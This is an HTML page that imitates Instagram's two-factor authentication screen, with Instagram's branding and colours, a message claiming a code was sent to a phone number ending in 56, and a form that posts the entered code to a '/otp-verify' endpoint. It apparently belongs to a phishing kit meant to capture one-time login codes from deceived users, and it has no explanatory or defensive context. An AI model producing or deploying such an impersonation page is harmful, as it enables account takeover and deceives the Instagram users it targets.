<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram â€¢ Two-Factor Authentication</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .otp-container {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 30px;
      width: 350px;
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
      color: #262626;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 12px 0;
      border: 1px solid #dbdbdb;
      font-size: 14px;
    }
    button {
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="otp-container">
    <h2>Enter Confirmation Code</h2>
    <p>We sent a 6-digit code to your number ending in **56.</p>
    <form action="/otp-verify" method="POST">
      <input type="text" name="otp" placeholder="Confirmation code" required />
      <button type="submit">Confirm</button>
    </form>
  </div>
</body>
</html>
